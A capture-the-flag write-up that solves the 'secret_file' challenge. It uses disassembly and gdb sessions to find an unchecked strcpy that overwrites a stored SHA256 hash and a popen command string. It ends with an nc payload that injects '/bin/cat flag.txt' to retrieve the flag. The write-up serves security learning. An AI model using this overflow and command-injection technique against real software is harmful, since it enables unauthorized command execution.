### Solved by barrebas

In this case, we're asked to retrieve a secret file and given.. another binary. What did you expect?

```bash
bas@tritonal:~/bin/ccc/secret_file$ ./secret_file 
AAAA
wrong password!
```

Hmm. Let's see what makes this thing tick:

```bash
bas@tritonal:~/bin/ccc/secret_file$ strings ./secret_file 
/lib64/ld-linux-x86-64.so.2
x]Cm
libcrypto.so.1.0.0
_ITM_deregisterTMCloneTable
__gmon_start__
_Jv_RegisterClasses
_ITM_registerTMCloneTable
SHA256_Final
SHA256_Init
_init
SHA256_Update
_fini
libc.so.6
strcpy
strrchr
puts
__stack_chk_fail
stdin
popen
fgets
fclose
getline
__cxa_finalize
strcmp
__libc_start_main
snprintf
_edata
__bss_start
_end
GLIBC_2.4
GLIBC_2.2.5
AUATUSH
[]A\A]
D$x1
D$xdH3
[]A\A]
D$h1
/bin/catH
 ./secreH
t_data.aH
9387a00eH
D$ H
31e413c5H
D$(H
5af9c08cH
D$0H
69cd119aH
D$8H
b4685ef3H
D$@H
bc8bcbe1H
D$HH
cf821611H
D$PH
19457127H
D$X1
D$hdH3
AWAVA
AUATL
[]A\A]A^A_
%02x
wrong password!
;*3$"
```

We see strings like `bc8bcbe1H`, which look like part of a hash being pushed onto the stack. Combining the hash part gives a SHA256 hash which has no known plaintext. Hmmm! Since this is an exploit-focused binary, let's exploit it!

It gets interesting around this code:

```
     e8e:   rep stos QWORD PTR es:[rdi],rax
     e91:   lea    rdi,[rbx+0x100]
     e98:   mov    rcx,rsp
     e9b:   movabs rax,0x7461632f6e69622f
     ea5:   mov    QWORD PTR [rsp],rax
     ea9:   movabs rax,0x65726365732f2e20
     eb3:   mov    QWORD PTR [rsp+0x8],rax
     eb8:   movabs rax,0x612e617461645f74
     ec2:   mov    QWORD PTR [rsp+0x10],rax
     ec7:   mov    eax,0x6373
     ecc:   mov    WORD PTR [rsp+0x18],ax
     ed1:   xor    eax,eax
     ed3:   call   a30 <snprintf@plt>
     ed8:   lea    rcx,[rsp+0x20]
     edd:   mov    esi,0x41
     ee2:   movabs rax,0x6530306137383339
     eec:   mov    QWORD PTR [rsp+0x20],rax
     ef1:   lea    rdi,[rbx+0x11b]
     ef8:   movabs rax,0x3563333134653133
     f02:   mov    QWORD PTR [rsp+0x28],rax
     f07:   lea    rdx,[rip+0x106]        # 1014 <_fini+0x10>
     f0e:   movabs rax,0x6338306339666135
     f18:   mov    QWORD PTR [rsp+0x30],rax
     f1d:   movabs rax,0x6139313164633936
     f27:   mov    QWORD PTR [rsp+0x38],rax
     f2c:   movabs rax,0x3366653538363462
     f36:   mov    QWORD PTR [rsp+0x40],rax
     f3b:   movabs rax,0x3165626362386362
     f45:   mov    QWORD PTR [rsp+0x48],rax
     f4a:   movabs rax,0x3131363132386663
     f54:   mov    QWORD PTR [rsp+0x50],rax
     f59:   movabs rax,0x3732313735343931
     f63:   mov    QWORD PTR [rsp+0x58],rax
     f68:   xor    eax,eax
     f6a:   mov    BYTE PTR [rsp+0x60],0x0
     f6f:   call   a30 <snprintf@plt>
     f74:   mov    rax,QWORD PTR [rsp+0x68]
     f79:   xor    rax,QWORD PTR fs:0x28
     f82:   jne    f8a <__cxa_finalize@plt+0x4aa>
     f84:   add    rsp,0x70
     f88:   pop    rbx
     f89:   ret    
```

It passes a few strings to the stack. We'll be seeing them later. Let's run the binary in `gdb`.

```bash
gdb-peda$ checksec
CANARY    : ENABLED
FORTIFY   : disabled
NX        : ENABLED
PIE       : ENABLED
RELRO     : FULL
```

PIE is enabled, so find out the base address of the binary with `vmmap`. Our input gets processed here:

```
     b40:   call   ad0 <getline@plt>
     b45:   cmp    rax,0xffffffffffffffff
     b49:   je     c4c <__cxa_finalize@plt+0x16c>
     b4f:   mov    rdi,QWORD PTR [rsp+0x8]
     b54:   mov    esi,0xa
     b59:   call   a40 <strrchr@plt>
     b5e:   test   rax,rax
     b61:   je     c4c <__cxa_finalize@plt+0x16c>
     b67:   mov    BYTE PTR [rax],0x0
     b6a:   mov    rsi,QWORD PTR [rsp+0x8]
     b6f:   mov    rdi,r13
     b72:   lea    rbp,[r13+0x15c]
     b79:   lea    rbx,[r13+0x17c]
     b80:   lea    r12,[r13+0x1bc]
     b87:   call   9e0 <strcpy@plt>
```

We have an unchecked `strcpy`. Lovely. Let's see what it will copy where:

```
gdb-peda$ vmmap
Start              End                Perm  Name
0x0000555555554000 0x0000555555556000 r-xp  /home/bas/bin/ccc/secret_file/secret_file
0x0000555555755000 0x0000555555756000 r--p  /home/bas/bin/ccc/secret_file/secret_file
0x0000555555756000 0x0000555555757000 rw-p  /home/bas/bin/ccc/secret_file/secret_file
...
gdb-peda$ b *0x0000555555554000+0xb87
Breakpoint 4 at 0x555555554b87
gdb-peda$ c

...

=> 0x555555554b87:  call   0x5555555549e0 <strcpy@plt>
   0x555555554b8c:  mov    edx,0x100
   0x555555554b91:  mov    rsi,rbp
   0x555555554b94:  mov    rdi,r13
   0x555555554b97:  call   0x555555554dd0
Guessed arguments:
arg[0]: 0x7fffffffe190 --> 0x0 
arg[1]: 0x555555757010 --> 0x41414141 ('AAAA')
``` 

So it will copy our input to the stack. Let's examine the stack:

```
gdb-peda$ x/200wx 0x7fffffffe190
0x7fffffffe190: 0x00000000  0x00000000  0x00000000  0x00000000
0x7fffffffe1a0: 0x00000000  0x00000000  0x00000000  0x00000000
0x7fffffffe1b0: 0x00000000  0x00000000  0x00000000  0x00000000
0x7fffffffe1c0: 0x00000000  0x00000000  0x00000000  0x00000000
0x7fffffffe1d0: 0x00000000  0x00000000  0x00000000  0x00000000
0x7fffffffe1e0: 0x00000000  0x00000000  0x00000000  0x00000000
0x7fffffffe1f0: 0x00000000  0x00000000  0x00000000  0x00000000
0x7fffffffe200: 0x00000000  0x00000000  0x00000000  0x00000000
0x7fffffffe210: 0x00000000  0x00000000  0x00000000  0x00000000
0x7fffffffe220: 0x00000000  0x00000000  0x00000000  0x00000000
0x7fffffffe230: 0x00000000  0x00000000  0x00000000  0x00000000
0x7fffffffe240: 0x00000000  0x00000000  0x00000000  0x00000000
0x7fffffffe250: 0x00000000  0x00000000  0x00000000  0x00000000
0x7fffffffe260: 0x00000000  0x00000000  0x00000000  0x00000000
0x7fffffffe270: 0x00000000  0x00000000  0x00000000  0x00000000
0x7fffffffe280: 0x00000000  0x00000000  0x00000000  0x00000000
0x7fffffffe290: 0x6e69622f  0x7461632f  0x732f2e20  0x65726365
0x7fffffffe2a0: 0x61645f74  0x612e6174  0x39006373  0x61373833
0x7fffffffe2b0: 0x33653030  0x31346531  0x35356333  0x63396661
0x7fffffffe2c0: 0x36633830  0x31646339  0x62613931  0x35383634
0x7fffffffe2d0: 0x62336665  0x63623863  0x63316562  0x31323866
0x7fffffffe2e0: 0x31313136  0x37353439  0x00373231  0x00007fff
0x7fffffffe2f0: 0x00000000  0x00000000  0xf7ffa828  0x00007fff
0x7fffffffe300: 0xffffe390  0x00007fff  0xffffe3a8  0x00007fff
0x7fffffffe310: 0x00000000  0x00000001  0xf7ffe758  0x00007fff
0x7fffffffe320: 0x13742321  0x00000000  0xf7a071ef  0x00007fff
```

Nice, what are those bytes at `0x7fffffffe290`? 

```
gdb-peda$ x/2s 0x7fffffffe290
0x7fffffffe290:  "/bin/cat ./secret_data.asc"
0x7fffffffe2ab:  "9387a00e31e413c55af9c08c69cd119ab4685ef3bc8bcbe1cf82161119457127"
```

Hey, that second one looks like the SHA256 hash! We'll be able to overwrite this... Seeing as it's stored as a string, better set a breakpoint on `strcmp()` for later...

```
     bd5:   call   a80 <strcmp@plt>
```

Restarted the binary:

```
gdb-peda$ b *0x0000555555554000+0xbd5
Breakpoint 2 at 0x555555554bd5
gdb-peda$ c
AAAA

...

=> 0x555555554bd5:  call   0x555555554a80 <strcmp@plt>
   0x555555554bda:  mov    r12d,eax
   0x555555554bdd:  test   eax,eax
   0x555555554bdf:  jne    0x555555554c40
   0x555555554be1:  lea    rdi,[r13+0x100]
Guessed arguments:
arg[0]: 0x7fffffffe2ab ("9387a00e31e413c55af9c08c69cd119ab4685ef3bc8bcbe1cf82161119457127")
arg[1]: 0x7fffffffe30c ("003daa08bd98e706782e059cbadf83277b5296645a98dfb636131e32cd7f131d")
```

OK, so it will compare the SHA256 hash of our input with the one stored on the stack. The nice thing, however, is that it will only hash the first 0x100 bytes! This means we can predict the hash we get:

```
gdb-peda$ r
warning: the debug information found in "/lib64/ld-2.13.so" does not match "/lib64/ld-linux-x86-64.so.2" (CRC mismatch).

AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

...

   0x555555554bc5:  jne    0x555555554ba0
   0x555555554bc7:  lea    rsi,[r13+0x17c]
   0x555555554bce:  lea    rdi,[r13+0x11b]
=> 0x555555554bd5:  call   0x555555554a80 <strcmp@plt>

...

Guessed arguments:
arg[0]: 0x7fffffffe2ab ("9387a00e31e413c55af9c08c69cd119ab4685ef3bc8bcbe1cf82161119457127")
arg[1]: 0x7fffffffe30c ("e075f2f51cad23d0537186cfcd50f911ea954f9c2e32a437f45327f1b7899bbb")

...

Breakpoint 2, 0x0000555555554bd5 in ?? ()
```

And if we do it again, but send 512 * 'A':

```
gdb-peda$ r
warning: the debug information found in "/lib64/ld-2.13.so" does not match "/lib64/ld-linux-x86-64.so.2" (CRC mismatch).

AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

...

=> 0x555555554bd5:  call   0x555555554a80 <strcmp@plt>
   0x555555554bda:  mov    r12d,eax
   0x555555554bdd:  test   eax,eax
   0x555555554bdf:  jne    0x555555554c40
   0x555555554be1:  lea    rdi,[r13+0x100]
Guessed arguments:
arg[0]: 0x7fffffffe2ab ('A' <repeats 65 times>"\340, u\362\365\034\255#\320Sq\206\317\315P\371\021\352\225O\234.2\244\067\364S'\361\267\211\233\273e075f2f51cad23d0537186cfcd50f911ea954f9c2e32a437f45327f1b7899bbb")
arg[1]: 0x7fffffffe30c ("e075f2f51cad23d0537186cfcd50f911ea954f9c2e32a437f45327f1b7899bbb")
```

We've overwritten part of the hash on the stack, yet the hash of our input stayed the same. After some trial & error, I could reliably over the hash:

```bash
bas@tritonal:~/bin/ccc/secret_file$ echo 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAe075f2f51cad23d0537186cfcd50f911ea954f9c2e32a437f45327f1b7899bbb' | ./secret_file 
sh: 1: AAAAAAAAAAAAAAAAAAAAAAAAAAAe075f2f51cad23d0537186cfcd50f911ea954f9c2e32a437f45327f1b7899bbb: not found
```

What's left now is to exploit it to grab the flag:

```bash
bas@tritonal:~$ nc challs.campctf.ccc.ac 10105
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/bin/cat flag.txt       ; #e075f2f51cad23d0537186cfcd50f911ea954f9c2e32a437f45327f1b7899bbb
CAMP15_82da7965eb0a3ee1fb4d5d0d8804cc409ad04a4f5e06be2f2bbdbf1c0cd638a7
```

